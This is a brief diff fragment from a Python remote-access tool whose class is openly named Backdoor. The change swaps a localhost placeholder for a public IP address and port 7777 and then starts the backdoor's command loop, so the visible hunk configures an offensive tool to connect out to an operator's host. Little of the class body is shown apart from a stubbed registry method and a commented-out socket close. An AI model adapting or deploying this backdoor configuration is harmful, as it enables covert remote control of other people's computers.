@@ -309,5 +309,5 @@ class Backdoor:
             #self.sock.close()
     def winreg(self,file, path):
         pass
-back = Backdoor("127.0.0.1",1) # Backdoor("ip",port)
+back = Backdoor("191.214.20.84",7777) # Backdoor("ip",port)
 back.commands_initiating()
